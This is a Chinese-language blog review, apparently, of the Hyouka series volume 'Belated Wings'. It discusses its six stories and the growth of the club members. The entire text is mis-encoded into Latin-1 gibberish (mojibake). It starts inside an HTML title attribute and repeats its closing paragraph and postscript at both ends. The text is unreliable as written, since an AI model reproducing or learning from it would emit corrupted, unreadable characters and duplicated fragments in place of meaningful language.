å½¢çš„å‘½è¿ç‰¢ç¬¼ï¼Œè¿˜æ˜¯å¯¹æ”¹å˜çš„ææƒ§ï¼Ÿ-è¿™æœ¬ä¹¦æ²¡æœ‰åè®°ï¼Œå†æ€ä¹ˆçœ‹æœ€åä¸€é¡µéƒ½åªæ˜¯å†·å†°å†°çš„å›¾ä¹¦åœ¨ç‰ˆç¼–ç›®æ•°æ®ï¼Œæˆ‘ç›¸ä¿¡æ²¡æœ‰åè®°æ˜¯å› ä¸ºç±³æ³½ç©—ä¿¡å¸Œæœ›æœ€åè¿™å‡ æ®µå¯¹è¯èƒ½ä¹…ä¹…ç•™å­˜åœ¨è¯»è€…è„‘æµ·ï¼Œæ¯•ç«Ÿè¿™éƒ¨ä¹¦ç›¸è¾ƒäºå‰å‡ éƒ¨å¾ˆç‰¹åˆ«ã€‚ä¸è¿‡ä»¤äººæ„‰æ‚¦çš„æ˜¯ï¼Œæ­¤å¤„å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„å¦ä¸€æ¡çº¿æ¸æ¸æµ®å‡ºï¼šæŠ˜æœ¨ä¸åƒåç”°çš„å…³ç³»ã€‚åƒåç”°å¼•å¯¼äº†æŠ˜æœ¨é‡æ–°æ¸´æœ›ç«ç‘°è‰²çš„äººç”Ÿï¼ŒåŠ¨æ‘‡äº†æŠ˜æœ¨â€œèŠ‚èƒ½ä¸»ä¹‰â€çš„ä¿¡æ¡ï¼Œæˆä¸ºäº†ç»“æŸæŠ˜æœ¨â€œæ‚ é•¿çš„å‡æœŸâ€çš„é‚£ä¸ªäººã€‚å¯ä»¥è¯´ï¼ŒæŠ˜æœ¨å·²ç»å–œæ¬¢ä¸Šäº†å¥¹ã€‚æ—¢ç„¶åƒåç”°çš„è¿·èŒ«ä¸ä¼šæŒä¹…ï¼Œå› ä¸ºæ­¤æ¬¡ç»å†ï¼Œåƒåç”°åœ¨æ­¤ä¹‹åå¿…ç„¶ä¼šå’ŒæŠ˜æœ¨åŠ æ·±ç¾ç»Šã€‚è¯·æœŸå¾…å§ã€‚-PSâ€¦â€¦ï¼Ÿï¼šè¯´æ˜¯æ ¡å›­æ¨ç†çš„å°è¯´ï¼Œä½†å®é™…ä¸Šè®¸å¤šæ¢è®¨çš„äº‹ç‰©ä¸€ç‚¹ä¹Ÿä¸æ ¡å›­ï¼Œæ›´ä¸æ˜¯ä¸ºäº†æ¨ç†è€Œæ¨ç†ï¼Œæ›´å¤šçš„æ˜¯å¯¹æˆé•¿ã€ç¤¾ä¼šã€äººç”Ÿä»·å€¼çš„æ€è€ƒã€‚ä¸å…¶è¯´æ˜¯è½»å°è¯´ï¼Œæˆ‘åå‘äºè®¤ä¸ºè¿™æ˜¯çº¯æ–‡å­¦ã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæˆ‘å–œæ¬¢ã€‚å¸Œæœ›å¤§å®¶èƒ½åˆ†äº«ä¸€ä¸‹å…³äºè¿™æœ¬ä¹¦çš„æ„Ÿæƒ³å§ã€‚" class="headerlink" title="###å‰è¨€å‡†å¤‡çœ‹ä¹‹å‰ï¼Œæˆ‘ç•™æ„åˆ°è¿™æœ¬ä¹¦ä¸å‰å‡ æœ¬æœ‰äº›è®¸ä¸åŒã€‚è‹±æ–‡çš„å‰¯æ ‡é¢˜æ¶ˆå¤±äº†ã€‚å°é¢çš„é…å›¾æ˜¯å¤©å°ï¼Œæ˜¯ä¸€ç§ç”ŸåŠ¨æ˜æ™°çš„è‰²å½©å§ã€‚å¤©ç©ºä¸å¤©å°æŸ“ä¸Šç»¿è‰²è°ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆä»¤æˆ‘ç•™æ„äº†è®¸ä¹…ã€‚ä¸»è¦è¿˜æ˜¯å°åº•çš„æ–‡å­—ä»¤æˆ‘å¾ˆåœ¨æ„ï¼šä¹‹å‰å‡ æœ¬éƒ½åªæ˜¯åœ¨æ­¤æŠ›å‡ºæ‚¬å¿µ&#x2F;ç–‘é—®ï¼Œä»¤è¯»è€…äºä¹¦ä¸­æ‰¾åˆ°ç­”æ¡ˆï¼Œè€Œè¿™é‡Œå´åœ¨åé¢é™„ä¸Šäº†è¿™æ ·çš„æ–‡å­—ï¼šâ€œå…¨ä¹¦åˆ†ä¸ºå…­ä¸ªçŸ­ç¯‡ï¼Œåœ¨å……æ»¡æ´»åŠ›åˆå¸¦ç‚¹è‹¦æ¶©çš„æ•…äº‹é‡Œï¼Œå¤ç±ç ”ç©¶ç¤¾å››åæˆå‘˜çš„è¿‡å»å’Œæœªæ¥ä¹Ÿé€æ¸æ˜æœ—â€¦â€¦â€è¯­æ°”åº”è¯¥å¾ˆå¹³æ·¡å§ï¼Œä½†æ˜¯ä»¿ä½›ä¸€ç›´åœ¨æš—ç¤ºæˆ‘è¿™ä¸€éƒ¨ä¸ç®€å•ã€‚è¿™å¥è¯åœ¨è¯•å›¾ä¼ è¾¾ç€ä»€ä¹ˆå—ï¼Ÿå·²ç»ç¡®å®šäº†å…¨ä¹¦çš„åŸºè°ƒå—ï¼Ÿæˆ‘å¾ˆå¥½å¥‡ã€‚###æ•…äº‹1ï¼šã€Šç®±å†…çš„ç¼ºå¤±ã€‹æ¡ˆä»¶æœ¬èº«ä¸å¤æ‚ã€‚æŠ•ç¥¨çš„ç¥¨æ•°æ¯”äººæ•°å¤šï¼Œäºæ˜¯é‡Œå¿—å‘æŠ˜æœ¨æ±‚åŠ©ã€‚åœ¨2äººçš„æ•£æ­¥ä¸å¯¹è¯ä¸­ï¼ŒçœŸç›¸é€æ¸æµ®å‡ºæ°´é¢ã€‚å›æœ›åŒç³»åˆ—ç¬¬5éƒ¨ã€Šä¸¤äººè·ç¦»çš„æ¦‚ç®—ã€‹ï¼Œå…¨ä¹¦ç”¨æŠ˜æœ¨äºâ€œæ˜Ÿè°·æ¯â€é•¿è·‘ä¸­çš„æ€è€ƒä¸²è”ï¼Œæ­¤å¤„æ‰‹æ³•ä¸å…¶é¢‡ä¸ºç›¸ä¼¼ã€‚å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„æ•…äº‹å¾€å¾€ä¸åœ¨æ¡ˆä»¶æœ¬èº«ã€‚æƒ³æƒ³å°åº•çš„è¯ï¼Œä¸éš¾çŒœåˆ°æ­¤å¤„å†™çš„æ˜¯é‡Œå¿—çš„è½¬å˜ã€‚ç¬¬ä¸‰éƒ¨ã€Šåº“ç‰¹åˆ©äºšèŠ™å¡çš„é¡ºåºã€‹ä¸­ï¼Œé‡Œå¿—æ€»æ˜¯å¿µå¨ç€â€œæ•°æ®åº“æ˜¯å¾—ä¸å‡ºç»“è®ºçš„â€è¿™æ ·çš„è¯ã€‚ï¼ˆé¡ºå¸¦ä¸€æï¼Œç¬¬ä¸‰éƒ¨å¯¹å››äººçš„å½¢è±¡åˆ»ç”»å¾ˆç”ŸåŠ¨ï¼Œä¸ªäººå¾ˆå–œæ¬¢ã€‚ï¼‰ç„¶è€Œä¹‹æ‰€ä»¥ä¸€ç›´å¿µå¨ï¼Œæƒ³å¿…ä¹Ÿæ˜¯å› ä¸ºæœ¬äººä¸ç”˜å¿ƒâ€”â€”å°½ç®¡é‚£æ—¶é‡Œå¿—ä¹Ÿè¯•ç€æ¨ç†ï¼Œä¸è¿‡ä»–å‘ç°è‡ªå·±åšä¸åˆ°ã€‚è€Œåœ¨æ­¤ï¼Œé‡Œå¿—æ˜æ˜¾æ¥å—äº†è‡ªå·±æ²¡æœ‰æŠ˜æœ¨é‚£æ ·çš„æ‰èƒ½çš„äº‹å®ï¼Œæ€æƒ³ä¸Šå·²ç»åšäº†è½¬å˜ï¼Œä»–ä¾æ—§æ˜¯é‚£ä¸ªåœ¨è¡—æœºæ¸¸æˆä¸­è¾“äº†ä¹Ÿç¬‘å¾—ç¿çƒ‚çš„é‡Œå¿—ã€‚ä¸è¿‡é‡Œå¿—å¯¹å…¬å¹³æ­£ä¹‰çš„æ‰§ç€ã€å¯¹è‡ªå·±è®¤ä¸ºæ­£ç¡®çš„äº‹ç‰©çš„åšæŒä»æœªæ”¹å˜ã€‚è‹¥éå¦‚æ­¤ï¼Œä»–ä¾¿ä¸ä¼šä¸ºå­¦å¼Ÿæ‰“æŠ±ä¸å¹³ï¼Œä¾¿ä¸ä¼šå»è¯·æ±‚æŠ˜æœ¨è§£è°œã€‚å˜ä¸ä¸å˜ï¼ŒæŠŠé‡Œå¿—å½¢è±¡åˆ»ç”»çš„æä¸ºé²œæ˜ã€‚è¿™ä¸ªæ•…äº‹çœŸæ­£æƒ³è¦è¡¨è¾¾çš„æ˜¯è¿™æ ·å§ã€‚###æ•…äº‹2ï¼šã€Šé•œä¸­ä¸å¾—è§ã€‹ç”¨æ‘©è€¶èŠ±çš„è§†è§’æ¢å¯»æŠ˜æœ¨çš„è¿‡å»â€”â€”æœ‰æ„æ€çš„è§†è§’ã€‚æ—©å·²ç–‘æƒ‘æ‘©è€¶èŠ±ä¹‹å‰ä¸ºä»€ä¹ˆä¼šè®¨åŒæŠ˜æœ¨ï¼Œæœ¬ç¯‡åˆ™è¿›è¡Œäº†è§£ç­”ï¼Œæ¯•ç«Ÿå¤ç±ç ”ç©¶ç¤¾ç³»åˆ—å‘æ¥æ˜¯é‡ç‚¹åœ¨äºæ¡ˆä»¶èƒŒåã€‚ä»–çš„åˆä¸­åŒå­¦ä»¬ä¼šè®¨åŒä»–ä»…ä»…æ˜¯å› ä¸ºä¸€æ¬¡è¯¯ä¼šï¼Œè€ŒæŠ˜æœ¨é€‰æ‹©äº†æ²‰é»˜ã€‚åœ¨æ‘©è€¶èŠ±çš„å¥½å¥‡å¿ƒé©±ä½¿ä¸‹ï¼Œç»ˆäºäº†è§£äº†æŠ˜æœ¨æ‰€ä½œæ‰€ä¸ºçš„åŸå› ã€‚åœ¨æ‘©è€¶èŠ±é“æ­‰ä¹‹åï¼ŒæŠ˜æœ¨çœ‹ä¼¼æ¼«ä¸ç»å¿ƒï¼Œä½†æ˜¯ä¸€å¥â€œæŠ˜æœ¨çš„è§†çº¿æ¸¸ç§»ä¸å®šâ€çš„æå†™å±•ç°äº†ä»–å†…å¿ƒçš„æ·±å—è§¦åŠ¨ã€‚è¿™ä¸€ç¯‡æ•…äº‹åˆ»ç”»äº†æŠ˜æœ¨åšå¥½äº‹ä¸ç•™åçš„â€œè‹±é›„â€å½¢è±¡ï¼Œå…¶å®ä¹Ÿä¾§é¢åæ˜ äº†æŠ˜æœ¨æœ¬èº«å¹¶ä¸æ¶ˆæã€‚æŠ˜æœ¨éª¨å­é‡Œå’Œé‡Œå¿—æ˜¯ä¸€æ ·çš„ï¼Œåƒåç”°åªæ˜¯å”¤é†’äº†ä»–çš„æ¿€æƒ…ã€‚ä¸ªäººè®¤ä¸ºæ­¤æ–‡æ¶‰åŠåˆ°äº†æ ¡å›­æ¬ºå‡Œï¼Œä»æ—è§‚è€…çš„è§’åº¦å‡ºå‘å±•ç°äº†æ ¡å›­â€œå†·æš´åŠ›â€çš„å¯æ€•ã€‚æ—è§‚è€…ä¸åº”æ—è§‚ã€‚è‹¥ç›´æ¥ä»‹å…¥ä¸å¦¥ï¼Œæš—ä¸­å¸®åŠ©ä¸å¤±ä¸ºä¸€ç§å¥½æ–¹æ³•â€”â€”ç±³æ³½ç©—ä¿¡ä¹Ÿè®¸æƒ³ä¼ è¾¾çš„æ˜¯è¿™ä¸ªã€‚ä¸å¾—è§çš„ï¼ŒçœŸçš„åœ¨é•œä¸­å—ï¼Ÿ###æ•…äº‹3ï¼šã€Šç¾¤å±±å·²æ”¾æ™´ï¼Ÿã€‹æŠ˜æœ¨æ¢æ˜äº†å®é™…ä¸Šä¸å–œæ¬¢ç›´å‡æœºçš„è€å¸ˆåœ¨æŸæ—¥æ—©æ™¨è¯´å‡ºâ€œæˆ‘å–œæ¬¢ç›´å‡æœºâ€çš„ç¼˜ç”±ã€‚çœ‹åˆ°ä¸€åŠçš„æ—¶å€™å…¶å®å¤§éƒ¨åˆ†äººä¾¿éƒ½èƒ½æ¨¡æ¨¡ç³Šç³ŠçŒœåˆ°ç¼˜ç”±äº†ã€‚å½“ç„¶é‡ç‚¹ä¾æ—§ä¸åœ¨æ¡ˆä»¶ä¸Šã€‚æŠ˜æœ¨è¯´å‡ºâ€œæˆ‘å¾ˆå¥½å¥‡â€çš„æ—¶å€™ï¼Œæ— è®ºé‡Œå¿—ã€åƒåç”°ã€æ‘©è€¶èŠ±è¿˜æ˜¯è¯»è€…éƒ½ä¼šå¤§åƒä¸€æƒŠå§ã€‚è¿™åˆ™æ•…äº‹ä¸é•¿ï¼Œåƒæ˜¯ä¸€ç§è¿‡æ¸¡ã€‚ç„¶è€Œè¯´åˆ°è¿‡æ¸¡å°±ä¼šæƒ³åˆ°è½¬å˜â€”â€”èŠ‚èƒ½ä¸»ä¹‰çš„æŠ˜æœ¨å¼€å§‹æ¸´æœ›æœ¬ä¹¦ä¸­æ‰€è¯´çš„â€œç«ç‘°è‰²çš„äººç”Ÿâ€ã€‚æŸç§ç¨‹åº¦ä¸Šï¼ŒæŠ˜æœ¨å·²ç»æ”¾å¼ƒäº†èŠ‚èƒ½ä¸»ä¹‰ã€‚åƒåç”°æ˜¯å¼•å­ï¼Œæ ¹æœ¬åŠ¨åŠ›æ˜¯åŒé‡Œå¿—ä¸€æ ·çš„ã€å†…å¿ƒæ·±å¤„å¯¹æŸäº›ä¸œè¥¿çš„æ‰§ç€å’Œæ¸´æœ›ã€‚æˆ‘ç›¸ä¿¡é‡Œå¿—åœ¨æ•´ä¸ªç³»åˆ—ä¸­æ›´åƒæ˜¯æŠ˜æœ¨çš„çœŸæˆ‘ä¹‹ä½“ç°ã€‚é€šè¿‡ä¸¤äººè¡¨ç°çš„å·®å¼‚ï¼Œä¾¿èƒ½çœ‹å‡ºæŠ˜æœ¨è·ç¦»çœŸæ­£çš„è‡ªæˆ‘è¿˜æœ‰å¤šè¿œã€‚è¿™æ˜¯æˆ‘å¯¹é‡Œå¿—çš„ç†è§£ï¼šæŠ˜æœ¨å†…å¿ƒçš„é•œåƒã€‚###æ•…äº‹4ï¼šã€Šæˆ‘ä»¬çš„ä¼ è¯´ä¹‹ä¹¦ã€‹æ‘©è€¶èŠ±çš„è§†è§’ã€‚çœŸç›¸çš„æ­ç¤ºè€…å°±æ˜¯â€œå‡¶æ‰‹â€æœ¬äººï¼Œååˆ†æœ‰è¶£ã€‚æœ¬æ–‡æ¢è®¨äº†ä¸€ä¸ªé—®é¢˜ï¼šä¸ªä½“åœ¨é›†ä½“ä¹‹ä¸­ï¼Œåº”è¯¥ä¸ºäº†é›†ä½“çš„åˆ©ç›Šè€Œç‰ºç‰²è‡ªå·±ï¼Œè¿˜æ˜¯åº”è¯¥ä¸ºäº†è‡ªå·±çš„å‰é€”è€Œæ”¾å¼ƒé›†ä½“ï¼Ÿæ²³å†…å­¦å§è‡ªå·±é€€å‡ºæ¼«ç ”ï¼Œå´å®‰æ’ç¾½ä»æ‹…ä»»ç¤¾é•¿ï¼Œæ€å¯è°“æ”¾ä¸‹ï¼Ÿè€Œå…¶åŠæ‘©è€¶èŠ±é€€å‡ºä¹Ÿæ˜¯ä¸ºäº†æ¼«ç ”ä¸æ‘©è€¶èŠ±çš„åˆ©ç›Šæœ€å¤§åŒ–ã€‚ç°å®ç”Ÿæ´»å¾€å¾€ä¸ä¼šå‡ºç°æ•…äº‹ä¸­æ¼«ç ”å®Œå…¨ä¸¤æåˆ†åŒ–çš„æƒ…å†µã€‚æ— è®ºåšå‡ºä»€ä¹ˆé€‰æ‹©ï¼Œæ€»æœ‰äººè¦å—ä¼¤ã€‚å› æ­¤ï¼Œæˆ‘æ›´å€¾å‘äºéµå¾ªè‡ªå·±çš„æœ¬å¿ƒã€‚æ‘©è€¶èŠ±çš„é€‰æ‹©ä¹Ÿè®¸ä¸ä¸€å®šæ­£ç¡®ï¼Œæ›´æœ‰å¯èƒ½æ ¹æœ¬æ— å¯¹é”™ä¹‹åˆ†ï¼Œä½†å¥¹è‡³å°‘éµä»äº†è‡ªå·±çš„æœ¬å¿ƒã€‚###æ•…äº‹5ï¼šã€Šæ‚ é•¿çš„å‡æœŸã€‹è¿™åˆ™æ•…äº‹è¯¦ç»†è¯´æ˜äº†æŠ˜æœ¨æˆä¸ºèŠ‚èƒ½ä¸»ä¹‰è€…çš„åŸå› ã€‚æ•…äº‹çš„ç»“å°¾å€ŸæŠ˜æœ¨çš„å§å§ä¹‹å£è¯´äº†è¿™ä¹ˆä¸€å¥è¯ï¼šâ€œä»Šåä½ ä¼šè¿æ¥æ‚ é•¿çš„å‡æœŸï¼Œè¿™æ ·ä¹Ÿå¥½ï¼Œä½ å°±å¥½å¥½ä¼‘æ¯å§ï¼Œæ²¡é—®é¢˜ï¼Œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜ã€‚â€è¿™é‡Œçš„â€œæ‚ é•¿å‡æœŸâ€å…¶å®æ˜¯ä¸€è¯­ä¸‰å…³ï¼Œæ—¢å®æŒ‡æŠ˜æœ¨å³å°†è¿æ¥çš„æ¼«é•¿æš‘å‡ï¼Œä¹Ÿæš—æŒ‡æŠ˜æœ¨ä¹‹åæ¼«æ¼«æ— æœŸçš„èŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ï¼Œæ›´æŒ‡çš„æ˜¯å†…å¿ƒçš„ç¼“æ…¢æ”¹å˜ã€‚â€œèº«ä½“ä¼‘æ¯çš„æ—¶å€™ï¼Œå†…å¿ƒå¿…é¡»æœ‰æ‰€æ”¹å˜â€ï¼Œæš—å–»äº†æŠ˜æœ¨å³å°†å˜æˆä¸€ä¸ªèŠ‚èƒ½ä¸»ä¹‰è€…ï¼ŒèŠ‚èƒ½ä¸»ä¹‰ç”Ÿæ´»ä¸­å†…å¿ƒå´å¹¶ä¸åšå®šï¼Œç»ˆå°†è½¬å˜æ€æƒ³ã€‚æ•…äº‹æœ€ååˆåŠ äº†ä¸€å¥ï¼šâ€œä¹Ÿä¼šæœ‰äººæ¥ç»“æŸä½ è¿™æ‚ é•¿çš„å‡æœŸã€‚â€è¯´æ˜æš‘å‡ç»ˆå°†è¿‡å»ï¼ŒèŠ‚èƒ½ä¸»ä¹‰çš„ç”Ÿæ´»å°†ä¸å†ï¼Œå†…å¿ƒæœ€ç»ˆä¹Ÿä¼šå®Œæˆè½¬å˜ï¼Œæ›´åŠ æˆç†Ÿã€‚ç±³æ³½ç©—ä¿¡åˆ»æ„å®‰æ’æŠ˜æœ¨å’Œåƒåç”°äºŒäººåœ¨è¿™ä¸ªæ•…äº‹é‡Œäº’åŠ¨ï¼Œä¼ è¾¾ç€æ‰€è°“çš„â€œæœ‰äººâ€å°±æ˜¯åƒåç”°ï¼Œæœ¬æ–‡æ˜¯å®˜æ–¹å‘ç³–çš„é“ºå«ä¹‹ä¸€ã€‚###æ•…äº‹6ï¼šã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹ä¸ç®€å•çš„ä¸€éƒ¨ä¹¦çš„æœ€åä¸€ç« ï¼Œä¸”æ ‡é¢˜å’Œä¹¦çš„æ ‡é¢˜ç›¸åŒï¼Œæš—ç¤ºç€å…¶åˆ†é‡ä¹‹é‡ã€‚ç±³æ³½ç©—ä¿¡æ›´ä¸ºç”¨å¿ƒåœ°å»åˆ»ç”»äº†äººç‰©å½¢è±¡ã€‚ç¯‡å¹…ä¸Šç¨é•¿ï¼Œæ•…äº‹çš„æ¶æ„å’Œç«‹æ„æ›´æ˜¯é«˜æ˜ï¼Œå…·å¤‡ä¸°å¯Œçš„æˆå‰§æ€§å’Œæ€æƒ³ã€‚å‰é¢å‡ ä¸ªæ•…äº‹éƒ½æ˜¯åœ¨è®²æŠ˜æœ¨ã€ç¦éƒ¨å’Œä¼ŠåŸï¼Œæœ€åä¸€ä¸ªè‡ªç„¶ç•™ç»™äº†åƒåç”°çˆ±ç‘ ã€‚â€œæ¡ˆä»¶â€çš„èµ·å› æ˜¯æœ‰ä¸€å¤©åƒåç”°çš„çˆ¶äº²çªç„¶å‘Šè¯‰å¥¹ä¸ä¸€å®šè¦å†ç»§æ‰¿å®¶ä¸šäº†ã€‚æ¯”å–»ä¸ºä¸€é“é€‰æ‹©é¢˜çš„è¯ï¼Œâ€œä¸å¿…é¡»â€å°±æ„å‘³ç€å³å¯ç”¨é€‰ç»§æ‰¿å®¶ä¸šï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä¸ç»§æ‰¿ï¼Œå› æ­¤åœ¨æˆ‘ä»¬çœ‹æ¥è¿™å®æ˜¯ä¸€é“å¼€æ”¾çš„é€åˆ†é¢˜ï¼Œé€‰æ‹©ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œå‡ºè·¯å˜å¤šäº†ï¼Œåº”è¯¥å¼€å¿ƒæ‰å¯¹ï¼Œåœ¨æ—äººçœ‹æ¥åƒåç”°æ ¹æœ¬ä¸å¿…è¿™ä¹ˆçƒ¦æ¼ï¼Œç„¶è€Œåœ¨åƒåç”°çœ¼ä¸­æƒ…å†µå´å¹¶éå¦‚æ­¤ã€‚å› ä¸ºå¥¹ä¸æ˜ç™½è¯¥ä¸è¯¥ç”¨è¿™è¿Ÿæ¥çš„ç¿…è†€å±•ç¿…é£ç¿”ã€‚ä¸ç¦æƒ³è¯´å°è¯´è¯»æ¥æ€»æ˜¯å¼¥æ¼«ç€ä¸€ç§æ·¡æ·¡çš„è‹¦æ¶©ï¼ˆå¦‚åŒå°åº•æ–‡å­—æ‰€è¯´ï¼‰ï¼Œè¿œæ²¡æœ‰åŠ¨ç”»æ¥çš„æ˜å¿«ã€‚ç¬¬ä¸€éƒ¨ã€Šå†°è“ã€‹çš„I screamå·²ç»ä¸ºæ•´ä¸ªç³»åˆ—å¥ å®šäº†åŸºè°ƒã€‚ç¬¬ä¸€éƒ¨ä¹¦ä¸­åƒåç”°çš„èˆ…èˆ…å…³è°·çº¯æ›¾è¿™æ ·è·Ÿå¹´å¹¼çš„åƒåç”°è§£é‡Šâ€œå†°è“â€ï¼šâ€œæ˜¯è¦å˜åšå¼ºçš„æ„æ€ã€‚å¦‚æœè½¯å¼±çš„è¯ï¼Œæ€»æœ‰ä¸€å¤©ä¼šè¿æ‚²é¸£éƒ½å‘ä¸å‡ºæ¥ã€‚è¿™æ ·çš„è¯ï¼Œå°±ç®—æ´»ç€ï¼Œä¹Ÿåªæ˜¯è¡Œå°¸èµ°è‚‰ã€‚â€ä½œè€…å€Ÿèˆ…èˆ…ä¹‹å£è¯´è¿™æ®µè¯æš—æŒ‡çš„è‡ªç„¶æ˜¯èº«ä¸ºå®¶æ—ç»§æ‰¿äººçš„åƒåç”°çš„æŸç§å‘½è¿ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¹´å¹¼çš„åƒåç”°åœ¨å¬å®Œèˆ…èˆ…çš„è¿™å¥è¯åå°±å“­äº†ã€‚å¥¹å†…å¿ƒä¸€å®šæ˜¯å¯¹è‡ªå·±â€œç¬¼ä¸­é¸Ÿâ€çš„å‘½è¿åšè¿‡æŸç§æŠ—äº‰çš„ï¼Œä½†å¥¹è®¤ä¸ºè¿™ç§æŠ—äº‰æ— æ³•æ”¹å˜ä»€ä¹ˆï¼Œäºæ˜¯å°±æ­¤æ”¾å¼ƒã€‚ç„¶è€Œæœ‰ä¸€å¤©è¿™ä»¶äº‹çœŸçš„æˆçœŸäº†ï¼Œè¿™ä¸ªæ—¶å€™åƒåç”°æ‰å‘ç°è‡ªå·±å¹¶æ²¡æœ‰ä¸ºæ­¤åšè¿‡ä»»ä½•å‡†å¤‡ï¼Œç”šè‡³è¿è¿™ä»¶äº‹æœ¬èº«æ˜¯ä¸æ˜¯è‡ªå·±çœŸçš„æƒ³è¦çš„ä¹Ÿè¦é‡æ–°æ€è€ƒï¼Œè¿™ä¸ªæ—¶å€™æ‰çœŸæ­£å¼€å§‹æƒ¶æã€‚æŠ˜æœ¨å¯¹è¿™ç§å¿ƒç†æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„æ¯”å–»ï¼šå¥½æ¯”æœ‰äº›ä¸ä¿¡è€¶ç¨£çš„äººå”±èµæ­Œä¼šè§‰å¾—åˆ«æ‰­ä¸€æ ·ã€‚åŸæœ¬æ²¡æœ‰è‡ªç”±çš„åƒåç”°èƒ½å”±å‡ºæ†§æ†¬è‡ªç”±çš„æ­Œè¯ï¼Œä½†å½“å¥¹çœŸæ­£æœ‰äº†è‡ªç”±ååè€Œå”±ä¸å‡ºæ¥äº†ï¼Œçœ‹ä¼¼çŸ›ç›¾ï¼Œå®åˆ™ç¬¦åˆäººç‰©å¿ƒå¢ƒã€‚æ­£å¦‚æ•…äº‹çš„æ ‡é¢˜ã€Šè¿Ÿæ¥çš„ç¿…è†€ã€‹æ‰€æƒ³ä¼ è¾¾ç»™æˆ‘ä»¬çš„æ„ä¹‰ï¼šç¬¼ä¸­çš„é¸Ÿå„¿ä¼šæ†§æ†¬è‡ªç”±ï¼Œç„¶è€Œæ‰“å¼€é¸Ÿç¬¼åï¼Œå®ƒä»¬å´ä¼šå› è¿Ÿæ¥çš„ç¿…è†€è€Œææƒ§ã€‚å…¶å®ï¼Œæœ¬ä¹¦çš„å¦ä¸€ä¸ªè¯‘åâ€œäº‹åˆ°å¦‚ä»Šæ‰å«æˆ‘é£ç¿”â€æ›´è´´è¿‘åŸæ—¥æ–‡æ ‡é¢˜çš„ç›´è¯‘ï¼Œå¤§å¯ä»¥ä½“ä¼šä¸€ä¸‹ä¸ªä¸­å«ä¹‰ã€‚â€œè¿™è¿Ÿæ¥çš„ç¿…è†€ï¼Œè®©æˆ‘ä¸çŸ¥æ‰€æªã€‚â€åƒåç”°è¯´å‡ºçš„è¿™å¥è¯å†²å‡»åŠ›å·¨å¤§ã€‚å¿½ç„¶è€Œè‡³çš„è‡ªç”±ï¼Œå……æ»¡æœªçŸ¥ä¸å¯èƒ½æ€§çš„äººç”Ÿï¼Œå¦‚æ­¤ä¹‹å¤§çš„å†²å‡»ï¼Œå¿…ç„¶åŠ¨æ‘‡äº†åƒåç”°å¤šå¹´æ¥ä½œä¸ºåƒé‡‘åƒåç”°æ‰€å­˜åœ¨çš„æ„ä¹‰ã€‚å³ä½¿æˆ‘ä»¬ä¸çŸ¥é“åƒåç”°åŸæœ¬æ„¿æ„è¢«ç»§æ‰¿äººçš„èº«ä»½æŸç¼šä¸å¦ï¼Œä¹Ÿä¸çŸ¥é“å¥¹æ˜¯å¦çœŸçš„æ¸´æœ›è‡ªç”±ï¼Œä½†èƒ½ç¡®å®šçš„æ˜¯ï¼Œå¥¹é¢å¯¹æ— é™å¯èƒ½æ€§æ—¶çš„è¿·èŒ«ç»ä¸ä¼šæŒä¹…ã€‚æ•…äº‹åœ¨æŠ˜æœ¨æ‰¾åˆ°åƒåç”°åæˆ›ç„¶è€Œæ­¢ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºç­”æ¡ˆï¼Œä¹Ÿå°±æ˜¯è¯´åšå‡ºä»€ä¹ˆé€‰æ‹©å·²ç»ä¸é‡è¦äº†ã€‚å› ä¸ºè¿™ä¸ªå‘½é¢˜ä¸æ˜¯æˆ‘ä»¬æ¯ä¸€ä¸ªäººéœ€è¦æ€è€ƒçš„ï¼š**çœŸæ­£æŸç¼šæˆ‘ä»¬çš„åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯æ— å½¢çš„å‘½è¿ç‰¢ç¬¼ï¼Œè¿˜æ˜¯å¯¹æ”¹å˜çš„ææƒ§ï¼Ÿ  **è¿™æœ¬ä¹¦æ²¡æœ‰åè®°ï¼Œå†æ€ä¹ˆçœ‹æœ€åä¸€é¡µéƒ½åªæ˜¯å†·å†°å†°çš„å›¾ä¹¦åœ¨ç‰ˆç¼–ç›®æ•°æ®ï¼Œæˆ‘ç›¸ä¿¡æ²¡æœ‰åè®°æ˜¯å› ä¸ºç±³æ³½ç©—ä¿¡å¸Œæœ›æœ€åè¿™å‡ æ®µå¯¹è¯èƒ½ä¹…ä¹…ç•™å­˜åœ¨è¯»è€…è„‘æµ·ï¼Œæ¯•ç«Ÿè¿™éƒ¨ä¹¦ç›¸è¾ƒäºå‰å‡ éƒ¨å¾ˆç‰¹åˆ«ã€‚ä¸è¿‡ä»¤äººæ„‰æ‚¦çš„æ˜¯ï¼Œæ­¤å¤„å¤ç±ç ”ç©¶ç¤¾ç³»åˆ—çš„å¦ä¸€æ¡çº¿æ¸æ¸æµ®å‡ºï¼šæŠ˜æœ¨ä¸åƒåç”°çš„å…³ç³»ã€‚åƒåç”°å¼•å¯¼äº†æŠ˜æœ¨é‡æ–°æ¸´æœ›ç«ç‘°è‰²çš„äººç”Ÿï¼ŒåŠ¨æ‘‡äº†æŠ˜æœ¨â€œèŠ‚èƒ½ä¸»ä¹‰â€çš„ä¿¡æ¡ï¼Œæˆä¸ºäº†ç»“æŸæŠ˜æœ¨â€œæ‚ é•¿çš„å‡æœŸâ€çš„é‚£ä¸ªäººã€‚å¯ä»¥è¯´ï¼ŒæŠ˜æœ¨å·²ç»å–œæ¬¢ä¸Šäº†å¥¹ã€‚æ—¢ç„¶åƒåç”°çš„è¿·èŒ«ä¸ä¼šæŒä¹…ï¼Œå› ä¸ºæ­¤æ¬¡ç»å†ï¼Œåƒåç”°åœ¨æ­¤ä¹‹åå¿…ç„¶ä¼šå’ŒæŠ˜æœ¨åŠ æ·±ç¾ç»Šã€‚è¯·æœŸå¾…å§ã€‚##PSâ€¦â€¦ï¼Ÿï¼šè¯´æ˜¯æ 